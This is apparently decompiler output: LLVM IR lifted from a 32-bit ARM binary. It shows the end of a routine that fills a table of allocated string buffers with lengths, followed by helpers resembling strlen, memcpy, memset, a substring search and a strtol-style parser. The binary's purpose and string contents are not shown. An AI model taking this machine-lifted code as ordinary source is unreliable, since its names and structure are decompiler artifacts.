  store i32 %v0_10fe4, i32* @global_var_1cbd8.317, align 4
  %v1_10fe8 = trunc i32 %v0_10fd4 to i8
  store i8 %v1_10fe8, i8* bitcast (i32* @global_var_1cbdc.318 to i8*), align 4
  %v0_10fec = load i32, i32* @r6, align 4
  %v1_10fec = trunc i32 %v0_10fec to i8
  store i8 %v1_10fec, i8* bitcast (i32* @global_var_1cbdd.319 to i8*), align 4
  %v1_10ff0 = call i32 @function_12578(i32 %v0_10fe0)
  %v0_10ff8 = load i32, i32* @r7, align 4
  store i32 %v1_10ff0, i32* @r5, align 4
  %v4_11000 = call i32 @function_11268(i32 %v1_10ff0, i32 ptrtoint ([9 x i8]* @global_var_14518.321 to i32), i32 %v0_10ff8)
  %v0_11008 = load i32, i32* @r5, align 4
  store i32 %v0_11008, i32* @global_var_1cbe0.322, align 4
  %v0_1100c = load i32, i32* @r7, align 4
  %v1_1100c = trunc i32 %v0_1100c to i8
  store i8 %v1_1100c, i8* bitcast (i32* @global_var_1cbe4.323 to i8*), align 4
  %v0_11010 = load i32, i32* @r6, align 4
  %v1_11010 = trunc i32 %v0_11010 to i8
  store i8 %v1_11010, i8* bitcast (i32* @global_var_1cbe5.324 to i8*), align 4
  %v1_11014 = call i32 @function_12578(i32 21)
  store i32 %v1_11014, i32* @r5, align 4
  %v3_11024 = call i32 @function_11268(i32 %v1_11014, i32 ptrtoint (i32* @global_var_145c0.326 to i32), i32 21)
  store i8 21, i8* bitcast (i32* @global_var_1cbec.327 to i8*), align 4
  %v0_11034 = load i32, i32* @r5, align 4
  store i32 %v0_11034, i32* @global_var_1cbe8.328, align 4
  %v0_11038 = load i32, i32* @r6, align 4
  %v1_11038 = trunc i32 %v0_11038 to i8
  store i8 %v1_11038, i8* bitcast (i32* @global_var_1cbed.329 to i8*), align 4
  %v1_1103c = call i32 @function_12578(i32 17)
  store i32 %v1_1103c, i32* @r5, align 4
  %v4_1104c = call i32 @function_11268(i32 %v1_1103c, i32 ptrtoint ([18 x i8]* @global_var_14524.331 to i32), i32 17)
  store i8 17, i8* bitcast (i32* @global_var_1cbf4.332 to i8*), align 4
  %v0_1105c = load i32, i32* @r5, align 4
  store i32 %v0_1105c, i32* @global_var_1cbf0.333, align 4
  %v0_11060 = load i32, i32* @r6, align 4
  %v1_11060 = trunc i32 %v0_11060 to i8
  store i8 %v1_11060, i8* bitcast (i32* @global_var_1cbf5.334 to i8*), align 4
  %v1_11064 = call i32 @function_12578(i32 12)
  store i32 %v1_11064, i32* @r5, align 4
  %v4_11074 = call i32 @function_11268(i32 %v1_11064, i32 ptrtoint ([13 x i8]* @global_var_14538.336 to i32), i32 12)
  %v0_1107c = load i32, i32* %sl.global-to-local, align 4
  store i8 12, i8* bitcast (i32* @global_var_1cbfc.337 to i8*), align 4
  %v0_11084 = load i32, i32* @r5, align 4
  store i32 %v0_11084, i32* @global_var_1cbf8.338, align 4
  %v0_11088 = load i32, i32* @r6, align 4
  %v1_11088 = trunc i32 %v0_11088 to i8
  store i8 %v1_11088, i8* bitcast (i32* @global_var_1cbfd.339 to i8*), align 4
  %v1_1108c = call i32 @function_12578(i32 %v0_1107c)
  %v0_11094 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_1108c, i32* @r5, align 4
  %v4_1109c = call i32 @function_11268(i32 %v1_1108c, i32 ptrtoint ([15 x i8]* @global_var_14548.341 to i32), i32 %v0_11094)
  %v0_110a4 = load i32, i32* @r5, align 4
  store i32 %v0_110a4, i32* @global_var_1cc00.342, align 4
  %v1_110a8 = trunc i32 %v0_11094 to i8
  store i8 %v1_110a8, i8* bitcast (i32* @global_var_1cc04.343 to i8*), align 4
  %v0_110ac = load i32, i32* @r6, align 4
  %v1_110ac = trunc i32 %v0_110ac to i8
  store i8 %v1_110ac, i8* bitcast (i32* @global_var_1cc05.344 to i8*), align 4
  %v1_110b0 = call i32 @function_12578(i32 19)
  store i32 %v1_110b0, i32* @r5, align 4
  %v4_110c0 = call i32 @function_11268(i32 %v1_110b0, i32 ptrtoint ([20 x i8]* @global_var_14558.346 to i32), i32 19)
  %v0_110c8 = load i32, i32* @r7, align 4
  store i8 19, i8* bitcast (i32* @global_var_1cc0c.347 to i8*), align 4
  %v0_110d0 = load i32, i32* @r5, align 4
  store i32 %v0_110d0, i32* @global_var_1cc08.348, align 4
  %v0_110d4 = load i32, i32* @r6, align 4
  %v1_110d4 = trunc i32 %v0_110d4 to i8
  store i8 %v1_110d4, i8* bitcast (i32* @global_var_1cc0d.349 to i8*), align 4
  %v1_110d8 = call i32 @function_12578(i32 %v0_110c8)
  %v0_110e0 = load i32, i32* @r7, align 4
  store i32 %v1_110d8, i32* @r5, align 4
  %v4_110e8 = call i32 @function_11268(i32 %v1_110d8, i32 ptrtoint ([9 x i8]* @global_var_1456c.351 to i32), i32 %v0_110e0)
  %v0_110f0 = load i32, i32* @r5, align 4
  store i32 %v0_110f0, i32* @global_var_1cc10.352, align 4
  %v0_110f4 = load i32, i32* @r7, align 4
  %v1_110f4 = trunc i32 %v0_110f4 to i8
  store i8 %v1_110f4, i8* bitcast (i32* @global_var_1cc14.353 to i8*), align 4
  %v0_110f8 = load i32, i32* @r6, align 4
  %v1_110f8 = trunc i32 %v0_110f8 to i8
  store i8 %v1_110f8, i8* bitcast (i32* @global_var_1cc15.354 to i8*), align 4
  %v1_110fc = call i32 @function_12578(i32 5)
  store i32 %v1_110fc, i32* @r5, align 4
  %v4_1110c = call i32 @function_11268(i32 %v1_110fc, i32 ptrtoint ([6 x i8]* @global_var_14578.356 to i32), i32 5)
  %v0_11114 = load i32, i32* %fp.global-to-local, align 4
  store i8 5, i8* bitcast (i32* @global_var_1cc1c.357 to i8*), align 4
  %v0_1111c = load i32, i32* @r5, align 4
  store i32 %v0_1111c, i32* @global_var_1cc18.358, align 4
  %v0_11120 = load i32, i32* @r6, align 4
  %v1_11120 = trunc i32 %v0_11120 to i8
  store i8 %v1_11120, i8* bitcast (i32* @global_var_1cc1d.359 to i8*), align 4
  %v1_11124 = call i32 @function_12578(i32 %v0_11114)
  %v0_1112c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_11124, i32* @r5, align 4
  %v4_11134 = call i32 @function_11268(i32 %v1_11124, i32 ptrtoint ([7 x i8]* @global_var_14580.361 to i32), i32 %v0_1112c)
  %v0_1113c = load i32, i32* @r5, align 4
  store i32 %v0_1113c, i32* @global_var_1cc20.362, align 4
  %v1_11140 = trunc i32 %v0_1112c to i8
  store i8 %v1_11140, i8* bitcast (i32* @global_var_1cc24.363 to i8*), align 4
  %v0_11144 = load i32, i32* @r6, align 4
  %v1_11144 = trunc i32 %v0_11144 to i8
  store i8 %v1_11144, i8* bitcast (i32* @global_var_1cc25.364 to i8*), align 4
  %v1_11148 = call i32 @function_12578(i32 23)
  %v4_11158 = call i32 @function_11268(i32 %v1_11148, i32 ptrtoint ([24 x i8]* @global_var_14588.366 to i32), i32 23)
  %v0_11160 = load i32, i32* @r6, align 4
  %v1_11160 = trunc i32 %v0_11160 to i8
  store i8 %v1_11160, i8* bitcast (i32* @global_var_1cc2d.367 to i8*), align 4
  store i32 %v1_11148, i32* @global_var_1cc28.368, align 4
  store i8 23, i8* bitcast (i32* @global_var_1cc2c.369 to i8*), align 4
  %v2_1116c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1116c, i32* @r4, align 4
  store i32 %v6_10cd8, i32* @r5, align 4
  store i32 %v9_10cd8, i32* @r6, align 4
  store i32 %v12_10cd8, i32* @r7, align 4
  ret i32 %v4_11158

; uselistorder directives
  uselistorder i32 %v1_11124, { 1, 0 }
  uselistorder i32 %v1_110d8, { 1, 0 }
  uselistorder i32 %v1_1108c, { 1, 0 }
  uselistorder i32 %v1_10ff0, { 1, 0 }
  uselistorder i32 %v1_10fcc, { 1, 0 }
  uselistorder i32 %v1_10fa8, { 1, 0 }
  uselistorder i32 %v1_10f80, { 1, 0 }
  uselistorder i32 %v1_10f34, { 1, 0 }
  uselistorder i32 %v1_10ec0, { 1, 0 }
  uselistorder i32 %v1_10dac, { 1, 0 }
  uselistorder i32 %v1_10d84, { 1, 0 }
  uselistorder i32 %v1_10d5c, { 1, 0 }
  uselistorder i32 %v1_10d10, { 1, 0 }
  uselistorder i32 %v1_10ce0, { 1, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i8 5, { 12, 13, 14, 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder i8 16, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16 }
  uselistorder i8 3, { 1, 0 }
  uselistorder i8 6, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 (i32, i32, i32)* @function_11268, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1cb48.213 to i32), { 5, 0, 1, 2, 3, 4 }
}

define i32 @function_111ec(i8* %arg1) local_unnamed_addr {
dec_label_pc_111ec:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r2, align 4
  %v3_111f0 = load i8, i8* %arg1, align 1
  %v4_111f0 = zext i8 %v3_111f0 to i32
  %v2_111f4 = icmp eq i8 %v3_111f0, 0
  br i1 %v2_111f4, label %dec_label_pc_11210, label %bb

dec_label_pc_11210:                               ; preds = %dec_label_pc_11200, %dec_label_pc_111ec
  %merge = phi i32 [ %v4_111f0, %dec_label_pc_111ec ], [ %v1_11200, %dec_label_pc_11200 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_111ec
  br label %dec_label_pc_11200

dec_label_pc_11200:                               ; preds = %dec_label_pc_11200, %bb
  %v0_11200 = phi i32 [ %v1_11200, %dec_label_pc_11200 ], [ 0, %bb ]
  %v1_11200 = add i32 %v0_11200, 1
  %v2_11204 = add i32 %v1_11200, %tmp
  %v3_11204 = inttoptr i32 %v2_11204 to i8*
  %v4_11204 = load i8, i8* %v3_11204, align 1
  %v2_11208 = icmp eq i8 %v4_11204, 0
  br i1 %v2_11208, label %dec_label_pc_11210, label %dec_label_pc_11200

; uselistorder directives
  uselistorder i32 %v1_11200, { 1, 0, 2 }
}

define i32 @function_11214(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11214:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_11214 = load i8, i8* %arg1, align 1
  %v3_11214 = zext i8 %v2_11214 to i32
  %v2_11218 = icmp eq i8 %v2_11214, 0
  br i1 %v2_11218, label %dec_label_pc_1125c, label %dec_label_pc_11220

dec_label_pc_11220:                               ; preds = %dec_label_pc_11214
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11224

dec_label_pc_11224:                               ; preds = %dec_label_pc_11224, %dec_label_pc_11220
  %v0_11224 = phi i32 [ %v1_11224, %dec_label_pc_11224 ], [ 0, %dec_label_pc_11220 ]
  %v1_11224 = add i32 %v0_11224, 1
  store i32 %v1_11224, i32* %ip.global-to-local, align 4
  %v2_11228 = add i32 %v1_11224, %tmp
  %v3_11228 = inttoptr i32 %v2_11228 to i8*
  %v4_11228 = load i8, i8* %v3_11228, align 1
  %v2_1122c = icmp eq i8 %v4_11228, 0
  br i1 %v2_1122c, label %dec_label_pc_11234, label %dec_label_pc_11224

dec_label_pc_11234:                               ; preds = %dec_label_pc_11224
  %v7_11234 = icmp eq i32 %v0_11224, -2
  br i1 %v7_11234, label %dec_label_pc_11254, label %dec_label_pc_11240.preheader

dec_label_pc_11240.preheader:                     ; preds = %dec_label_pc_11234, %dec_label_pc_1125c
  %storemerge = phi i32 [ %v3_11214, %dec_label_pc_1125c ], [ %v1_11224, %dec_label_pc_11234 ]
  %v2_1124c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11240

dec_label_pc_11240:                               ; preds = %dec_label_pc_11240.dec_label_pc_11240_crit_edge, %dec_label_pc_11240.preheader
  %v2_1124c = phi i32 [ %v5_1124c, %dec_label_pc_11240.dec_label_pc_11240_crit_edge ], [ %v2_1124c.pre, %dec_label_pc_11240.preheader ]
  %v0_11244 = phi i32 [ %v0_11244.pre, %dec_label_pc_11240.dec_label_pc_11240_crit_edge ], [ %tmp, %dec_label_pc_11240.preheader ]
  %v0_11240 = phi i32 [ %v0_11240.pre, %dec_label_pc_11240.dec_label_pc_11240_crit_edge ], [ %storemerge, %dec_label_pc_11240.preheader ]
  %v1_11240 = add i32 %v0_11240, -1
  store i32 %v1_11240, i32* @r2, align 4
  %v1_11244 = inttoptr i32 %v0_11244 to i8*
  %v2_11244 = load i8, i8* %v1_11244, align 1
  %v5_11244 = add i32 %v0_11244, 1
  store i32 %v5_11244, i32* %r1.global-to-local, align 4
  %v3_11248 = icmp eq i32 %v0_11240, 0
  %v3_1124c = inttoptr i32 %v2_1124c to i8*
  store i8 %v2_11244, i8* %v3_1124c, align 1
  %v4_1124c = load i32, i32* @r0, align 4
  %v5_1124c = add i32 %v4_1124c, 1
  store i32 %v5_1124c, i32* @r0, align 4
  br i1 %v3_11248, label %dec_label_pc_11254.loopexit, label %dec_label_pc_11240.dec_label_pc_11240_crit_edge

dec_label_pc_11240.dec_label_pc_11240_crit_edge:  ; preds = %dec_label_pc_11240
  %v0_11240.pre = load i32, i32* @r2, align 4
  %v0_11244.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11240

dec_label_pc_11254.loopexit:                      ; preds = %dec_label_pc_11240
  %v0_11254.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11254

dec_label_pc_11254:                               ; preds = %dec_label_pc_11254.loopexit, %dec_label_pc_11234
  %v0_11254 = phi i32 [ %v0_11254.pre, %dec_label_pc_11254.loopexit ], [ %v1_11224, %dec_label_pc_11234 ]
  ret i32 %v0_11254

dec_label_pc_1125c:                               ; preds = %dec_label_pc_11214
  store i32 %v3_11214, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11240.preheader

; uselistorder directives
  uselistorder i32 %v5_1124c, { 1, 0 }
  uselistorder i32 %v0_11244, { 1, 0 }
  uselistorder i32 %v1_11224, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v3_11214, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11240.preheader, { 1, 0 }
}

define i32 @function_11268(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11268:
  %ip.global-to-local = alloca i32, align 4
  %v2_11268 = icmp eq i32 %arg3, 0
  br i1 %v2_11268, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_11274, %dec_label_pc_11268
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_11268
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11274

dec_label_pc_11274:                               ; preds = %dec_label_pc_11274, %bb
  %v0_11274 = phi i32 [ %v1_1127c, %dec_label_pc_11274 ], [ 0, %bb ]
  %v2_11274 = add i32 %v0_11274, %arg2
  %v3_11274 = inttoptr i32 %v2_11274 to i8*
  %v4_11274 = load i8, i8* %v3_11274, align 1
  %v4_11278 = add i32 %v0_11274, %arg1
  %v5_11278 = inttoptr i32 %v4_11278 to i8*
  store i8 %v4_11274, i8* %v5_11278, align 1
  %v0_1127c = load i32, i32* %ip.global-to-local, align 4
  %v1_1127c = add i32 %v0_1127c, 1
  store i32 %v1_1127c, i32* %ip.global-to-local, align 4
  %v9_11280 = icmp eq i32 %v1_1127c, %arg3
  br i1 %v9_11280, label %.loopexit, label %dec_label_pc_11274

; uselistorder directives
  uselistorder i32 %v1_1127c, { 1, 2, 0 }
}

define i32 @function_1128c() local_unnamed_addr {
dec_label_pc_1128c:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v0_1128c = load i32, i32* @r1, align 4
  %v2_1128c = icmp eq i32 %v0_1128c, 0
  br i1 %v2_1128c, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_1128c
  %v2_11290 = load i32, i32* @r0, align 4
  ret i32 %v2_11290

bb3:                                              ; preds = %dec_label_pc_1128c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1129c

dec_label_pc_1129c:                               ; preds = %dec_label_pc_1129c.dec_label_pc_1129c_crit_edge, %bb3
  %v2_1129c = phi i32 [ %v1_112a0, %dec_label_pc_1129c.dec_label_pc_1129c_crit_edge ], [ 0, %bb3 ]
  %v0_1129c.off0 = phi i8 [ %extract.t, %dec_label_pc_1129c.dec_label_pc_1129c_crit_edge ], [ 0, %bb3 ]
  %v3_1129c = load i32, i32* @r0, align 4
  %v4_1129c = add i32 %v3_1129c, %v2_1129c
  %v5_1129c = inttoptr i32 %v4_1129c to i8*
  store i8 %v0_1129c.off0, i8* %v5_1129c, align 1
  %v0_112a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_112a0 = add i32 %v0_112a0, 1
  store i32 %v1_112a0, i32* %r3.global-to-local, align 4
  %v1_112a4 = load i32, i32* @r1, align 4
  %v9_112a4 = icmp eq i32 %v1_112a0, %v1_112a4
  br i1 %v9_112a4, label %dec_label_pc_112ac, label %dec_label_pc_1129c.dec_label_pc_1129c_crit_edge

dec_label_pc_1129c.dec_label_pc_1129c_crit_edge:  ; preds = %dec_label_pc_1129c
  %v0_1129c.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_1129c.pre to i8
  br label %dec_label_pc_1129c

dec_label_pc_112ac:                               ; preds = %dec_label_pc_1129c
  %v1_112ac = load i32, i32* @r0, align 4
  ret i32 %v1_112ac

; uselistorder directives
  uselistorder i32 %v1_112a0, { 1, 2, 0 }
}

define i32 @function_112b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_112b0:
  %v7_112c4 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_112c4, label %dec_label_pc_112c8, label %dec_label_pc_112d0

dec_label_pc_112c8:                               ; preds = %dec_label_pc_112e4, %dec_label_pc_112b0, %dec_label_pc_112d0
  ret i32 -1

dec_label_pc_112d0:                               ; preds = %dec_label_pc_112b0
  %tmp10 = icmp slt i32 %arg2, 1
  br i1 %tmp10, label %dec_label_pc_112c8, label %dec_label_pc_112d8

dec_label_pc_112d8:                               ; preds = %dec_label_pc_112d0
  br label %dec_label_pc_112f0

dec_label_pc_112e4:                               ; preds = %dec_label_pc_11308, %dec_label_pc_112f0
  %v1_112e4 = add i32 %v0_11310, 1
  %v9_112e8 = icmp eq i32 %v1_112e4, %arg2
  br i1 %v9_112e8, label %dec_label_pc_112c8, label %dec_label_pc_112f0

dec_label_pc_112f0:                               ; preds = %dec_label_pc_112e4, %dec_label_pc_112d8
  %v0_11310 = phi i32 [ %v1_112e4, %dec_label_pc_112e4 ], [ 0, %dec_label_pc_112d8 ]
  %v0_112fc = phi i32 [ %v1_112fc., %dec_label_pc_112e4 ], [ 0, %dec_label_pc_112d8 ]
  %v2_112f0 = add i32 %v0_112fc, %arg3
  %v3_112f0 = inttoptr i32 %v2_112f0 to i8*
  %v4_112f0 = load i8, i8* %v3_112f0, align 1
  %v2_112f4 = add i32 %v0_11310, %arg1
  %v3_112f4 = inttoptr i32 %v2_112f4 to i8*
  %v4_112f4 = load i8, i8* %v3_112f4, align 1
  %v9_112f8 = icmp eq i8 %v4_112f4, %v4_112f0
  %v1_112fc = add i32 %v0_112fc, 1
  %v1_112fc. = select i1 %v9_112f8, i32 %v1_112fc, i32 0
  br i1 %v9_112f8, label %dec_label_pc_11308, label %dec_label_pc_112e4

dec_label_pc_11308:                               ; preds = %dec_label_pc_112f0
  %v9_11308 = icmp eq i32 %v1_112fc., %arg4
  br i1 %v9_11308, label %dec_label_pc_11310, label %dec_label_pc_112e4

dec_label_pc_11310:                               ; preds = %dec_label_pc_11308
  %v1_11310 = add i32 %v0_11310, 1
  ret i32 %v1_11310

; uselistorder directives
  uselistorder i1 %v9_112f8, { 1, 0 }
  uselistorder i32 %v0_112fc, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_112c8, { 0, 2, 1 }
}

define i32 @function_11318(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11318:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v3_11318 = load i32, i32* @r4, align 4
  store i32 %v3_11318, i32* %stack_var_-28, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11324

dec_label_pc_11324:                               ; preds = %.thread, %dec_label_pc_1133c, %bb, %dec_label_pc_11318
  %v0_11324 = phi i32 [ %tmp, %dec_label_pc_11318 ], [ %v5_11324, %bb ], [ %v5_11324, %dec_label_pc_1133c ], [ %v5_11324, %.thread ]
  %v1_11324 = inttoptr i32 %v0_11324 to i8*
  %v2_11324 = load i8, i8* %v1_11324, align 1
  %v3_11324 = zext i8 %v2_11324 to i32
  %v5_11324 = add i32 %v0_11324, 1
  store i32 %v5_11324, i32* %r5.global-to-local, align 4
  %v7_1132c = icmp eq i8 %v2_11324, 9
  br i1 %v7_1132c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11324
  store i32 %v3_11324, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11324

bb:                                               ; preds = %dec_label_pc_11324
  %v8_11330 = icmp eq i8 %v2_11324, 32
  store i32 %v3_11324, i32* %r4.global-to-local, align 4
  br i1 %v8_11330, label %dec_label_pc_11324, label %dec_label_pc_1133c

dec_label_pc_1133c:                               ; preds = %bb
  %v7_1133c = icmp eq i8 %v2_11324, 10
  br i1 %v7_1133c, label %dec_label_pc_11324, label %dec_label_pc_11344

dec_label_pc_11344:                               ; preds = %dec_label_pc_1133c
  %v7_11344 = icmp eq i8 %v2_11324, 45
  br i1 %v7_11344, label %dec_label_pc_11424, label %dec_label_pc_1134c

dec_label_pc_1134c:                               ; preds = %dec_label_pc_11344
  %v7_1134c = icmp eq i8 %v2_11324, 43
  br i1 %v7_1134c, label %bb48, label %dec_label_pc_1135c

bb48:                                             ; preds = %dec_label_pc_1134c
  %v2_11350 = inttoptr i32 %v5_11324 to i8*
  %v3_11350 = load i8, i8* %v2_11350, align 1
  %v4_11350 = zext i8 %v3_11350 to i32
  store i32 %v4_11350, i32* %r4.global-to-local, align 4
  %v6_11350 = add i32 %v0_11324, 2
  store i32 %v6_11350, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1135c

dec_label_pc_1135c:                               ; preds = %bb48, %dec_label_pc_1134c, %dec_label_pc_11424
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_11424 ], [ 2147483647, %dec_label_pc_1134c ], [ 2147483647, %bb48 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_11424 ], [ 0, %dec_label_pc_1134c ], [ 0, %bb48 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_11364 = call i32 @function_11878(i32 %storemerge1, i32 %arg2)
  %v0_11368 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_11368, i32* @r1, align 4
  store i32 %v2_11364, i32* %r8.global-to-local, align 4
  store i32 %storemerge1, i32* @r0, align 4
  %v0_11374 = call i32 @function_11768()
  store i32 %v0_11374, i32* @lr, align 4
  %v0_11384.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11384

dec_label_pc_11384:                               ; preds = %.thread8, %dec_label_pc_1135c
  %v2_1140011 = phi i32 [ %v1_1141c26, %.thread8 ], [ 0, %dec_label_pc_1135c ]
  %v1_113dc = phi i32 [ %v0_1141024, %.thread8 ], [ 0, %dec_label_pc_1135c ]
  %v1_113c4 = phi i32 [ %v3_11408, %.thread8 ], [ %v0_11384.pre, %dec_label_pc_1135c ]
  %v1_11384 = urem i32 %v1_113c4, 256
  %v1_11388 = add nsw i32 %v1_11384, -48
  %v1_11390 = add nsw i32 %v1_11384, -97
  %v1_11394 = add i32 %v1_113c4, -48
  %v1_11398 = add nsw i32 %v1_11384, -65
  %tmp71 = icmp ult i32 %v1_11388, 10
  br i1 %tmp71, label %dec_label_pc_113c8, label %dec_label_pc_113a0

dec_label_pc_113a0:                               ; preds = %dec_label_pc_11384
  %v2_113a0 = icmp ugt i32 %v1_11398, 24
  %v7_113a0 = icmp eq i32 %v1_11398, 25
  %v2_113a4 = xor i1 %v7_113a0, true
  %v3_113a4 = and i1 %v2_113a0, %v2_113a4
  br i1 %v3_113a4, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_113a0
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_113a0, %bb49
  %v0_113b820 = phi i32 [ %v1_11394, %dec_label_pc_113a0 ], [ 0, %bb49 ]
  %v2_113a8 = xor i1 %v2_113a0, true
  %v3_113a8 = or i1 %v7_113a0, %v2_113a8
  br i1 %v3_113a8, label %bb51, label %bb52

bb51:                                             ; preds = %bb50
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v0_113b8 = phi i32 [ %v0_113b820, %bb50 ], [ 1, %bb51 ]
  br i1 %v3_113a4, label %bb53, label %bb54

bb53:                                             ; preds = %bb52
  %v6_113b0 = icmp ugt i32 %v1_11390, 24
  %v11_113b0 = icmp eq i32 %v1_11390, 25
  br label %bb54

bb54:                                             ; preds = %bb52, %bb53
  %v1_113b4 = phi i1 [ %v7_113a0, %bb52 ], [ %v11_113b0, %bb53 ]
  %v0_113b4 = phi i1 [ %v2_113a0, %bb52 ], [ %v6_113b0, %bb53 ]
  %v2_113b4 = xor i1 %v1_113b4, true
  %v3_113b4 = and i1 %v0_113b4, %v2_113b4
  br i1 %v3_113b4, label %dec_label_pc_11410, label %dec_label_pc_113b8

dec_label_pc_113b8:                               ; preds = %bb54
  %v2_113b8 = icmp eq i32 %v0_113b8, 0
  %. = select i1 %v2_113b8, i32 87, i32 55
  %v2_113c4 = sub i32 %v1_113c4, %.
  br label %dec_label_pc_113c8

dec_label_pc_113c8:                               ; preds = %dec_label_pc_11384, %dec_label_pc_113b8
  %v0_113dc34 = phi i32 [ %v1_11398, %dec_label_pc_11384 ], [ %., %dec_label_pc_113b8 ]
  %v3_1140012 = phi i32 [ %v1_11394, %dec_label_pc_11384 ], [ %v2_113c4, %dec_label_pc_113b8 ]
  %v1_113c8 = load i32, i32* %r6.global-to-local, align 4
  %v6_113cc = icmp slt i32 %v3_1140012, %v1_113c8
  br i1 %v6_113cc, label %dec_label_pc_113d0, label %dec_label_pc_11410

dec_label_pc_113d0:                               ; preds = %dec_label_pc_113c8
  %v3_113d0 = icmp uge i32 %v2_1140011, %v0_11374
  %v9_113d0 = icmp eq i32 %v2_1140011, %v0_11374
  %v2_113d4 = xor i1 %v3_113d0, true
  %v3_113d4 = or i1 %v9_113d0, %v2_113d4
  br i1 %v3_113d4, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_113d0
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_113d0, %bb57
  %v0_113dc33 = phi i32 [ %v0_113dc34, %dec_label_pc_113d0 ], [ 0, %bb57 ]
  %v2_113d8 = xor i1 %v9_113d0, true
  %v3_113d8 = and i1 %v3_113d0, %v2_113d8
  br i1 %v3_113d8, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v0_113dc = phi i32 [ %v0_113dc33, %bb58 ], [ 1, %bb59 ]
  %tmp72 = icmp slt i32 %v1_113dc, 0
  %v4_113dc = zext i1 %tmp72 to i32
  %v5_113dc = or i32 %v0_113dc, %v4_113dc
  %v7_113dc = icmp eq i32 %v5_113dc, 0
  br i1 %v7_113dc, label %dec_label_pc_113e8, label %.thread8

dec_label_pc_113e8:                               ; preds = %bb60
  %v1_113f4 = load i32, i32* %r8.global-to-local, align 4
  %v7_113f8 = icmp sgt i32 %v3_1140012, %v1_113f4
  br i1 %v7_113f8, label %bb63, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_113e8
  br label %bb64

bb63:                                             ; preds = %dec_label_pc_113e8
  %v2_113fc = icmp eq i1 %v9_113d0, false
  br i1 %v2_113fc, label %bb64, label %.thread8

bb64:                                             ; preds = %bb63, %.thread5
  %v4_1140013 = mul i32 %v1_113c8, %v2_1140011
  %v5_1140014 = add i32 %v4_1140013, %v3_1140012
  br label %.thread8

.thread8:                                         ; preds = %bb63, %bb60, %bb64
  %v1_1141c26 = phi i32 [ %v2_1140011, %bb63 ], [ %v2_1140011, %bb60 ], [ %v5_1140014, %bb64 ]
  %v0_1141024 = phi i32 [ -1, %bb63 ], [ -1, %bb60 ], [ 1, %bb64 ]
  %v0_11408 = load i32, i32* %r5.global-to-local, align 4
  %v1_11408 = inttoptr i32 %v0_11408 to i8*
  %v2_11408 = load i8, i8* %v1_11408, align 1
  %v3_11408 = zext i8 %v2_11408 to i32
  store i32 %v3_11408, i32* %r4.global-to-local, align 4
  %v5_11408 = add i32 %v0_11408, 1
  store i32 %v5_11408, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11384

